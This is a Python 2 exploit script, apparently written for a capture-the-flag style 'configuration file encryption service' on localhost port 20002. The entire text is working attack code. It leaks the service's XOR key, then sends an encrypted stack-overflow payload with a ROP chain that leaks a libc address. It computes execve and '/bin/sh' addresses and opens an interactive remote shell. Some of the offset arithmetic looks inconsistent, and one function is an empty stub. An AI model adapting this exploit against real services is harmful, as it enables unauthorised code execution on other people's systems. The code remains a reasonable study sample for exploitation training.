#!/usr/bin/python

import struct
import socket
import time



# Command Sending
def sentbuffer(s, fd,  payload):
	print fd.read(len('[-- Enterprise configuration file encryption service --]\n'))
	s.send('E')
	s.send(struct.pack("I", len(payload)))
	s.send(payload)
	return

# Encryption Function
def encrypt(data, key):
        key = key * ((len(data)/128)+1)
        return ''.join(chr(ord(a)^ord(b)) for a,b in zip(data, key))



# find encryption key
def findrkey(s, fd):
	# =============================================
	#            (Encryption KEy Leak)
	# ==============================================
	payload =  ''
	payload += '\x00'*256
	# Payload Sent
	sentbuffer(s, fd, payload)

	# Extract Data
	print fd.read(len('[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n'))

	data = fd.read(len(payload)+4)
	print 'Length Of Receiving Data : ', struct.unpack("I", data[:4])[0]
	print 'Leaked Key   : ', data[4:132].encode('hex')
	print 'Verify Again : ', data[132:].encode('hex')
	# Key
	return data[4:132]

def findlibaddr(s, fd, rkey):

	# ====================================================
	#            Stage Two ( Lib address Leak)
	# ====================================================
	shell = ''
	shell += struct.pack("I", 0x80495a0) # Call Nwrite
	shell +=  struct.pack("I", 0x080497f7) # Encrypt
	shell += struct.pack("I", 0)
	shell += struct.pack("I",0x804b3dc) # 0x804b3dc <write@got.plt>:
	shell += struct.pack("I",4)


	# payload
	payload = ''
	payload += 'A'*4096*32
	payload += 'B'*16
	payload += shell  # <-- EIP Point Detected

	payload = encrypt(payload, rkey)
	# Payload Sent
        s.send('E')
        s.send(struct.pack("I", len(payload)))
        s.send(payload)

	# Information Extraction
	print fd.read(len('[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n'))
	print [fd.read(len(payload)+4)]
	s.send('Q')
	d = fd.read(4)
	#print fd.read(len('[-- Enterprise configuration file encryption service --]\n'))
	time.sleep(0.5)
	print [d]
	write_addr = struct.unpack("I", d)[0]
	print "[*] Write@Got PLT Address : ", hex(write_addr)
	return write_addr


def openexecve(s, fd):

	return

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 20002))

#s.settimeout(3)
fd = s.makefile('rb')

# Finding Encryption Key
rkey = findrkey(s, fd)

# Sent Payload To Leak Libc Addrss
writeplt =  findlibaddr(s, fd, rkey)


# Distance Calculations
binsh  = 6156393370 - writeplt # Offset
execve = 6155750352 - writeplt # offset
print "[*] Leaked Write@plt addr : ", hex(writeplt)
print "[*] Leaked Bin Address    : ", hex(binsh)
print "[*] Leaked Execve Addres  : ", hex(execve)

rop = ''
rop += struct.pack("I", execve)
rop += struct.pack("I", 0x080497f7)
rop += struct.pack("I", binsh)
rop += struct.pack("I", 0)
rop += struct.pack("I", 0)


payload = ''
payload += 'A'*4096*32
payload += 'B'*16
payload += rop  # <-- EIP Point Detected

payload = encrypt(payload, rkey)
sentbuffer(s, fd,  payload)
s.send('Q')
s.settimeout(3)
fd.read(len(payload))

while True:
	try:
		time.sleep(0.1)
		print s.recv(1024)
		s.send(raw_input(':~$ ')+'\n')
	except:
		s.send(raw_input(':~$ ')+'\n')

s.close()

